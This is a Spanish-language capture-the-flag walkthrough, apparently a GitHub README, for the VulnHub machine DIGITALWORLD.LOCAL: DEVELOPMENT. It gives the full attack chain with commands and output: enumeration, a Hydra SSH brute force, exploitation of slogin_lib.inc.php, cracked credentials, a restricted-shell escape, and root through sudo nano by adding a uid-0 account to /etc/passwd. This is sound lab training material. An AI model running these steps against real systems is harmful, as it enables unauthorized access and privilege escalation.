# DIGITALWORLD.LOCAL-DEVELOPMENT
Desarrollo del CTF: DIGITALWORLD.LOCAL: DEVELOPMENT

## 1. Descargar y configurar la VM
> Download: https://www.vulnhub.com/entry/digitalworldlocal-development,280/
- El portal de inicio indica que han reportado el sistema como "inestable", sin embargo, tiene un mecanismo de control que bloquea ante escaneos agresivos.

## 2. Escaneo de Puertos

```
nmap -n -P0 -p- -sC -sV -O -T5 -oA full 10.10.10.139
Nmap scan report for 10.10.10.139
Host is up (0.00055s latency).
Not shown: 65530 closed ports
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 79:07:2b:2c:2c:4e:14:0a:e7:b3:63:46:c6:b3:ad:16 (RSA)
|_  256 24:6b:85:e3:ab:90:5c:ec:d5:83:49:54:cd:98:31:95 (ED25519)
113/tcp  open  ident?
|_auth-owners: oident
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
|_auth-owners: root
445/tcp  open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
|_auth-owners: root
8080/tcp open  http-proxy  IIS 6.0
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Date: Sat, 13 Mar 2021 01:10:47 GMT
|     Server: IIS 6.0
|     Last-Modified: Wed, 26 Dec 2018 01:55:41 GMT
|     ETag: "230-57de32091ad69"
|     Accept-Ranges: bytes
|     Content-Length: 560
|     Vary: Accept-Encoding
|     Connection: close
|     Content-Type: text/html
|     <html>
|     <head><title>DEVELOPMENT PORTAL. NOT FOR OUTSIDERS OR HACKERS!</title>
|     </head>
|     <body>
|     <p>Welcome to the Development Page.</p>
|     <br/>
|     <p>There are many projects in this box. View some of these projects at html_pages.</p>
|     <br/>
|     <p>WARNING! We are experimenting a host-based intrusion detection system. Report all false positives to patrick@goodtech.com.sg.</p>
|     <br/>
|     <br/>
|     <br/>
|     <hr>
|     <i>Powered by IIS 6.0</i>
|     </body>
|     <!-- Searching for development secret page... where could it be? -->
|     <!-- Patrick, Head of Development-->
|     </html>
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Date: Sat, 13 Mar 2021 01:10:47 GMT
|     Server: IIS 6.0
|     Allow: POST,OPTIONS,HEAD,GET
|     Content-Length: 0
|     Connection: close
|     Content-Type: text/html
|   RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|     Date: Sat, 13 Mar 2021 01:10:47 GMT
|     Server: IIS 6.0
|     Content-Length: 291
|     Connection: close
|     Content-Type: text/html; charset=iso-8859-1
|     <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
|     <html><head>
|     <title>400 Bad Request</title>
|     </head><body>
|     <h1>Bad Request</h1>
|     <p>Your browser sent a request that this server could not understand.<br />
|     </p>
|     <hr>
|     <address>IIS 6.0 Server at 10.10.10.139 Port 8080</address>
|_    </body></html>
```

<img src="https://github.com/El-Palomo/DIGITALWORLD.LOCAL-DEVELOPMENT/blob/main/devi1.jpg" width=80% />

## 3. Enumeración de Puertos

- Debido a que contiene algun mecanismo de control que nos puede bloquear vamos a realizar la enumeración lo más sigiloso posible.

### 3.1. Enumeración NETBIOS y SMB

```
root@kali:~/DEVI# nbtscan 10.10.10.139
Doing NBT name scan for addresses from 10.10.10.139

IP address       NetBIOS Name     Server    User             MAC address      
------------------------------------------------------------------------------
10.10.10.139     DEVELOPMENT      <server>  DEVELOPMENT      00:00:00:00:00:00


root@kali:~/DEVI# enum4linux -a -M -l -d 10.10.10.139 > enum4linux.txt
 ========================== 
|    Target Information    |
 ========================== 
Target ........... 10.10.10.139
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ==================================================== 
|    Enumerating Workgroup/Domain on 10.10.10.139    |
 ==================================================== 
[+] Got domain/workgroup name: WORKGROUP

 ============================================ 
|    Nbtstat Information for 10.10.10.139    |
 ============================================ 
Looking up status of 10.10.10.139
	DEVELOPMENT     <00> -         B <ACTIVE>  Workstation Service
	DEVELOPMENT     <03> -         B <ACTIVE>  Messenger Service
	DEVELOPMENT     <20> -         B <ACTIVE>  File Server Service
	..__MSBROWSE__. <01> - <GROUP> B <ACTIVE>  Master Browser
	WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
	WORKGROUP       <1d> -         B <ACTIVE>  Master Browser
	WORKGROUP       <1e> - <GROUP> B <ACTIVE>  Browser Service Elections

	MAC Address = 00-00-00-00-00-00

 ===================================== 
|    Session Check on 10.10.10.139    |
 ===================================== 
[+] Server 10.10.10.139 allows sessions using username '', password ''

 ===================================================== 
|    Getting information via LDAP for 10.10.10.139    |
 ===================================================== 
[E] Connection error

 =========================================== 
|    Getting domain SID for 10.10.10.139    |
 =========================================== 
Domain Name: WORKGROUP
Domain Sid: (NULL SID)
[+] Can't determine if host is part of domain or part of a workgroup

 ====================================== 
|    OS information on 10.10.10.139    |
 ====================================== 
[+] Got OS info for 10.10.10.139 from smbclient: 
[+] Got OS info for 10.10.10.139 from srvinfo:
	DEVELOPMENT    Wk Sv PrQ Unx NT SNT development server (Samba, Ubuntu)
	platform_id     :	500
	os version      :	6.1
	server type     :	0x809a03

 ============================= 
|    Users on 10.10.10.139    |
 ============================= 
index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: intern	Name: 	Desc: 

user:[intern] rid:[0x3e8]
	User Name   :	intern
	Full Name   :	
	Home Drive  :	\\development\intern
	Dir Drive   :	
	Profile Path:	\\development\intern\profile
	Logon Script:	
	Description :	
	Workstations:	
	Comment     :	
	Remote Dial :
	Logon Time               :	Wed, 31 Dec 1969 19:00:00 EST
	Logoff Time              :	Wed, 06 Feb 2036 10:06:39 EST
	Kickoff Time             :	Wed, 06 Feb 2036 10:06:39 EST
	Password last set Time   :	Sun, 15 Jul 2018 07:39:18 EDT
	Password can change Time :	Sun, 15 Jul 2018 07:39:18 EDT
	Password must change Time:	Wed, 13 Sep 30828 22:48:05 EDT
	unknown_2[0..31]...
	user_rid :	0x3e8
	group_rid:	0x201
	acb_info :	0x00000010
	fields_present:	0x00ffffff
	logon_divs:	168
	bad_password_count:	0x00000000
	logon_count:	0x00000000
	padding1[0..7]...
	logon_hrs[0..21]...
	Account Disabled         : False
	Password does not expire : False
	Account locked out       : False
	Password expired         : False
	Interdomain trust account: False
	Workstation trust account: False
	Server trust account     : False
	Trusted for delegation   : False


 =========================================== 
|    Machine Enumeration on 10.10.10.139    |
 =========================================== 
[E] Internal error.  Not implmented in this version of enum4linux.

 ========================================= 
|    Share Enumeration on 10.10.10.139    |
 ========================================= 

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	access          Disk      
	IPC$            IPC       IPC Service (development server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available

[+] Attempting to map shares on 10.10.10.139
//10.10.10.139/print$	Mapping: DENIED, Listing: N/A
//10.10.10.139/access	Mapping: DENIED, Listing: N/A
//10.10.10.139/IPC$	[E] Can't understand response:
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*

 ==================================================== 
|    Password Policy Information for 10.10.10.139    |
 ==================================================== 


[+] Attaching to 10.10.10.139 using a NULL share

[+] Trying protocol 139/SMB...

[+] Found domain(s):

	[+] DEVELOPMENT
	[+] Builtin

[+] Password Info for Domain: DEVELOPMENT

	[+] Minimum password length: 5
	[+] Password history length: None
	[+] Maximum password age: 37 days 6 hours 21 minutes 
	[+] Password Complexity Flags: 000000

		[+] Domain Refuse Password Change: 0
		[+] Domain Password Store Cleartext: 0
		[+] Domain Password Lockout Admins: 0
		[+] Domain Password No Clear Change: 0
		[+] Domain Password No Anon Change: 0
		[+] Domain Password Complex: 0

	[+] Minimum password age: None
	[+] Reset Account Lockout Counter: 30 minutes 
	[+] Locked Account Duration: 30 minutes 
	[+] Account Lockout Threshold: None
	[+] Forced Log off Time: 37 days 6 hours 21 minutes 


[+] Retieved partial password policy with rpcclient:

Password Complexity: Disabled
Minimum Password Length: 5


 ============================== 
|    Groups on 10.10.10.139    |
 ============================== 

[+] Getting builtin groups:

[+] Getting builtin group memberships:

[+] Getting local groups:

[+] Getting local group memberships:

[+] Getting domain groups:

[+] Getting domain group memberships:

 ======================================================================= 
|    Users on 10.10.10.139 via RID cycling (RIDS: 500-550,1000-1050)    |
 ======================================================================= 
[I] Found new SID: S-1-22-1
[I] Found new SID: S-1-5-21-779411179-1483911247-3630892801
[I] Found new SID: S-1-5-32
[+] Enumerating users using SID S-1-5-32 and logon username '', password ''

S-1-5-32-544 BUILTIN\Administrators (Local Group)
[E] No info found

S-1-5-32-545 BUILTIN\Users (Local Group)
[E] No info found

S-1-5-32-546 BUILTIN\Guests (Local Group)
[E] No info found

S-1-5-32-547 BUILTIN\Power Users (Local Group)
[E] No info found

S-1-5-32-548 BUILTIN\Account Operators (Local Group)
[E] No info found

S-1-5-32-549 BUILTIN\Server Operators (Local Group)
[E] No info found

S-1-5-32-550 BUILTIN\Print Operators (Local Group)
[E] No info found

[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
S-1-22-1-1000 Unix User\admin (Local User)
	User Name   :	intern
	Full Name   :	
	Home Drive  :	\\development\intern
	Dir Drive   :	
	Profile Path:	\\development\intern\profile
	Logon Script:	
	Description :	
	Workstations:	
	Comment     :	
	Remote Dial :
	Logon Time               :	Wed, 31 Dec 1969 19:00:00 EST
	Logoff Time              :	Wed, 06 Feb 2036 10:06:39 EST
	Kickoff Time             :	Wed, 06 Feb 2036 10:06:39 EST
	Password last set Time   :	Sun, 15 Jul 2018 07:39:18 EDT
	Password can change Time :	Sun, 15 Jul 2018 07:39:18 EDT
	Password must change Time:	Wed, 13 Sep 30828 22:48:05 EDT
	unknown_2[0..31]...
	user_rid :	0x3e8
	group_rid:	0x201
	acb_info :	0x00000010
	fields_present:	0x00ffffff
	logon_divs:	168
	bad_password_count:	0x00000000
	logon_count:	0x00000000
	padding1[0..7]...
	logon_hrs[0..21]...
	Account Disabled         : False
	Password does not expire : False
	Account locked out       : False
	Password expired         : False
	Interdomain trust account: False
	Workstation trust account: False
	Server trust account     : False
	Trusted for delegation   : False

S-1-22-1-1001 Unix User\patrick (Local User)

S-1-22-1-1002 Unix User\intern (Local User)

S-1-22-1-1003 Unix User\ossec (Local User)

S-1-22-1-1004 Unix User\ossecm (Local User)

S-1-22-1-1005 Unix User\ossecr (Local User)

S-1-5-21-779411179-1483911247-3630892801-513 DEVELOPMENT\None (Domain Group)
	Group Name:	None
	Description:	Ordinary Users
	Group Attribute:7
	Num Members:0

S-1-5-21-779411179-1483911247-3630892801-1000 DEVELOPMENT\intern (Local User)
	User Name   :	intern
	Full Name   :	
	Home Drive  :	\\development\intern
	Dir Drive   :	
	Profile Path:	\\development\intern\profile
	Logon Script:	
	Description :	
	Workstations:	
	Comment     :	
	Remote Dial :
	Logon Time               :	Wed, 31 Dec 1969 19:00:00 EST
	Logoff Time              :	Wed, 06 Feb 2036 10:06:39 EST
	Kickoff Time             :	Wed, 06 Feb 2036 10:06:39 EST
	Password last set Time   :	Sun, 15 Jul 2018 07:39:18 EDT
	Password can change Time :	Sun, 15 Jul 2018 07:39:18 EDT
	Password must change Time:	Wed, 13 Sep 30828 22:48:05 EDT
	unknown_2[0..31]...
	user_rid :	0x3e8
	group_rid:	0x201
	acb_info :	0x00000010
	fields_present:	0x00ffffff
	logon_divs:	168
	bad_password_count:	0x00000000
	logon_count:	0x00000000
	padding1[0..7]...
	logon_hrs[0..21]...
	Account Disabled         : False
	Password does not expire : False
	Account locked out       : False
	Password expired         : False
	Interdomain trust account: False
	Workstation trust account: False
	Server trust account     : False
	Trusted for delegation   : False

```

- Se identificaron los siguientes usuarios en la enumeración: intern, admin, patrick, ossec, ossecm y ossecr.

<img src="https://github.com/El-Palomo/DIGITALWORLD.LOCAL-DEVELOPMENT/blob/main/devi2.jpg" width=80% />

<img src="https://github.com/El-Palomo/DIGITALWORLD.LOCAL-DEVELOPMENT/blob/main/devi3.jpg" width=80% />


### 3.2. Enumeración HTTP

- El GOBUSTER se tira abajo el servidor. Toca realizar un escaneo manual.

<img src="https://github.com/El-Palomo/DIGITALWORLD.LOCAL-DEVELOPMENT/blob/main/devi4.jpg" width=80% />

- Toca revisar el código HTML de las páginas porque han dejado comentarios y browsear mucho.

| URL | Comentario |
| ------------- | ------------- |
|8080/development.html | Revisar HTML                   |
|8080/developmentsecretpage/ |                    |
|8080/developmentsecretpage/patrick.php |                    |
|8080/developmentsecretpage/sitemap.php| Revisar HTML       |
|8080/developmentsecretpage/sitemap.php?logout=1|  Portal de Login                  |
|8080/developmentsecretpage/securitynotice.php| Diccionario de contraseñas|
|8080/developmentsecretpage/directortestpagev1.php| Revisar HTML |
|:8080/downloads.html|Revisar HTML, se encuentra un archivo PCAP sin nada importante |

- Cuando intenté una inyección básica identificamos un mensaje de ALERTA sobre la librería SLOGIN_LIB.INC.PHP

<img src="https://github.com/El-Palomo/DIGITALWORLD.LOCAL-DEVELOPMENT/blob/main/devi5.jpg" width=80% />

<img src="https://github.com/El-Palomo/DIGITALWORLD.LOCAL-DEVELOPMENT/blob/main/devi6.jpg" width=80% />

> En resumen tenemos: listado de usuarios, un diccionario de credenciales y un mensaje de error de una librería.


## 4. Identificando la vulnerabilidad

### 4.1. Cracking ONLINE

- Tenemos usuarios y un diccionario podemos probar un ataque sobre SSH. Se volvió a caer el servidor (a reiniciar).

```
root@kali:~/DEVI# cat pass.txt 
password
Password
P@ssw0rd
P@ssw0rd1
P@ssw0rd2
P@ssw0rd3
P@ssw0rd4
P@ssw0rd5
P@ssw0rd1...
P@ssw0rd2...
P@ssw0rd3...
P@ssw0rd4...
P@ssw0rd5...
root@kali:~/DEVI# hydra -L users.txt -P pass.txt ssh://10.10.10.139
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-03-15 19:12:53
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 117 login tries (l:9/p:13), ~8 tries per task
[DATA] attacking ssh://10.10.10.139:22/
[STATUS] 42.00 tries/min, 42 tries in 00:01h, 82 to do in 00:02h, 16 active
```

<img src="https://github.com/El-Palomo/DIGITALWORLD.LOCAL-DEVELOPMENT/blob/main/devi7.jpg" width=80% />


### 4.2. Librería PHP vulnerable: slogin_lib.inc.php

- EXPLOIT-DB de inmediato muestra información sobre la librería: https://www.exploit-db.com/exploits/7444
- TIENES QUE LEER la vulnerabilidad. En resumen tiene dos manera de explotar: RFI (Remote File Inclusion) que no funcionó y un archivo por defecto que MILAGROSAMENTE y POR SUERTE estaba allí listo para utilizar (los CTF son asi).

<img src="https://github.com/El-Palomo/DIGITALWORLD.LOCAL-DEVELOPMENT/blob/main/devi8.jpg" width=80% />

<img src="https://github.com/El-Palomo/DIGITALWORLD.LOCAL-DEVELOPMENT/blob/main/devi9.jpg" width=80% />

- Claramente son MD5. Vamos a crackearlos: https://hashes.com/en/decrypt/hash


<img src="https://github.com/El-Palomo/DIGITALWORLD.LOCAL-DEVELOPMENT/blob/main/devi10.jpg" width=80% />

- Listo ya tenemos credenciales de usuarios. Vamos a ingresar por SSH.

| Usuario | Password |
| ------------- | ------------- |
|intern | 12345678900987654321    |
|patrick | P@ssw0rd25    |
|qiu | qiu    |
|admin | NO IDENTIFICADO    |


## 5. Acceso al servidor
- Nos conectamos con el usuario INTERN y notamos que tenemos una consola RESTRINGIDA.

<img src="https://github.com/El-Palomo/DIGITALWORLD.LOCAL-DEVELOPMENT/blob/main/devi11.jpg" width=80% />


- Existen muchas técnicas para ROMPER una SHELL RESTRINGIDA. Aquí hay un manual super lindo: https://www.exploit-db.com/docs/english/44592-linux-restricted-shell-bypass-guide.pdf. Yo me conocía el de VIM por ejemplo.



```
intern:~$ echo os.system("/bin/bash )
sh: 1: Syntax error: "(" unexpected
intern:~$ echo os.system("/bin/bash")
intern@development:~$ ls
access	local.txt  work.txt
intern@development:~$ ls -la
total 40
drwxr-xr-x 6 intern intern 4096 Mar 16 00:00 .
drwxr-xr-x 5 root   root   4096 Jun 14  2018 ..
drwxrwxrwx 9 intern intern 4096 Jul 16  2018 access
-rw------- 1 intern intern  102 Mar 15 22:28 .bash_history
drwx------ 2 intern intern 4096 Jul 16  2018 .cache
drwx------ 3 intern intern 4096 Jul 16  2018 .gnupg
-rw------- 1 intern intern  322 Mar 16 00:00 .lhistory
drwxrwxr-x 3 intern intern 4096 Jul 15  2018 .local
-rw-r--r-- 1 intern intern   46 Dec 26  2018 local.txt
-rw-r--r-- 1 intern intern  299 Dec 26  2018 work.txt
intern@development:~$ cat local.txt
Congratulations on obtaining a user shell. :)
intern@development:~$ cat work.txt 
1.	Tell Patrick that shoutbox is not working. We need to revert to the old method to update David about shoutbox. For new, we will use the old director's landing page.

2.	Patrick's start of the third year in this company!

3.	Attend the meeting to discuss if password policy should be relooked at.
```


## 6. Elevar Privilegios

- Empezamos a buscar archivos importanes en otros directorios /HOME/ y encontramos algo interesando en la carpeta /home/patrick/

```
intern@development:~$ ls -laR /home/
/home/patrick:
total 48
drwxr-xr-x 5 patrick patrick 4096 Mar 13 03:27 .
drwxr-xr-x 5 root    root    4096 Jun 14  2018 ..
-rw-r--r-- 1 patrick patrick  168 Jul 23  2018 access.txt
-rw------- 1 patrick patrick  136 Mar 16 00:11 .bash_history
-rw-r--r-- 1 patrick patrick  220 Jun 12  2018 .bash_logout
-rw-r--r-- 1 patrick patrick 3771 Jun 12  2018 .bashrc
drwx------ 2 patrick patrick 4096 Jun 12  2018 .cache
drwx------ 3 patrick patrick 4096 Jun 12  2018 .gnupg
drwxrwxr-x 3 patrick patrick 4096 Mar 13 03:27 .local
-rw-r--r-- 1 patrick patrick  425 Jul 23  2018 password.txt
-rw-r--r-- 1 patrick patrick  807 Jun 12  2018 .profile
-rw-r--r-- 1 patrick patrick    0 Jun 12  2018 .sudo_as_admin_successful
-rw------- 1 patrick patrick 1077 Aug 27  2018 .viminfo
ls: cannot open directory '/home/patrick/.cache': Permission denied
ls: cannot open directory '/home/patrick/.gnupg': Permission denied
```

<img src="https://github.com/El-Palomo/DIGITALWORLD.LOCAL-DEVELOPMENT/blob/main/devi13.jpg" width=80% />

- Al parecer podremos utilizar SUDO para elevar privilegios. El archivo con ese nombre asi lo sugiere.

### 6.2. Elevar privilegios con SUDO

- Ingresamos con el usuario PATRICK y verificamos los permisos de ejecución con SUDO.

```
intern@development:~$ su patrick
Password: 
patrick@development:/home/intern$ sudo -l
Matching Defaults entries for patrick on development:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User patrick may run the following commands on development:
    (ALL) NOPASSWD: /usr/bin/vim
    (ALL) NOPASSWD: /bin/nano
```
<img src="https://github.com/El-Palomo/DIGITALWORLD.LOCAL-DEVELOPMENT/blob/main/devi14.jpg" width=80% />


- Ya que podemos ejecutar NANO y VIM con privilegios de ROOT. Lo más facil es editar el archivo PASSWD y lograr acceso. Otro clásico para elevar privilegios.

```
// En KALI Linux
root@kali:~/DEVI# mkpasswd  -m sha-512 -S saltsalt -s
Password: 12345678
$6$saltsalt$9vIXh5xFJESF2.DxxXyWlpOT.0t06Y2Pk11StIw2L8oaOTl42ZfuhPPi5h2PPjbLI.FnnhTBEMMcL05LS2ZmY.


// En el CTF
patrick@development:/home/intern$ sudo /bin/nano /etc/passwd
ossecm:x:1004:1007::/var/ossec:/bin/false
ossecr:x:1005:1007::/var/ossec:/bin/false
oident:x:114:117::/:/usr/sbin/nologin
omar:$6$saltsalt$9vIXh5xFJESF2.DxxXyWlpOT.0t06Y2Pk11StIw2L8oaOTl42ZfuhPPi5h2PPjbLI.FnnhTBEMMcL05LS2ZmY.:0:0::/root/:/bin/bash
```

<img src="https://github.com/El-Palomo/DIGITALWORLD.LOCAL-DEVELOPMENT/blob/main/devi15.jpg" width=80% />


- Finalmente, obtenemos root

```
patrick@development:/home/intern$ su omar
Password: 
root@development:/home/intern# id
uid=0(root) gid=0(root) groups=0(root)
root@development:/home/intern# cd 
root@development:/root# ls
iptables-rules  lshell-0.9.9  proof.txt  smb.conf  tcpdumpclock.sh
root@development:/root# ls -la
total 72
drwx------  5 root  root    4096 Dec 26  2018 .
drwxr-xr-x 23 root  root    4096 Mar 15 23:15 ..
-rw-------  1 root  root    1660 Mar 15 22:28 .bash_history
-rw-r--r--  1 root  root    3106 Apr  9  2018 .bashrc
-rw-r--r--  1 root  root     644 Jun 14  2018 iptables-rules
drwxr-xr-x  3 root  root    4096 Jun 12  2018 .local
drwxr-xr-x  7 admin lpadmin 4096 Aug 23  2018 lshell-0.9.9
-rw-r--r--  1 root  root     148 Aug 17  2015 .profile
----------  1 root  root      43 Dec 26  2018 proof.txt
-rw-------  1 root  root    1024 Aug  1  2018 .rnd
-rw-r--r--  1 root  root      66 Sep 26  2018 .selected_editor
-rw-r--r--  1 root  root    9542 Jul 15  2018 smb.conf
drwx------  2 root  root    4096 Jun 10  2018 .ssh
-rwx------  1 root  root     229 Sep 26  2018 tcpdumpclock.sh
-rw-------  1 root  root     582 Aug 27  2018 .viminfo
-rw-r--r--  1 root  root     209 Aug  1  2018 .wget-hsts
root@development:/root# cat proof.txt
Congratulations on rooting DEVELOPMENT! :)
```

<img src="https://github.com/El-Palomo/DIGITALWORLD.LOCAL-DEVELOPMENT/blob/main/devi16.jpg" width=80% />


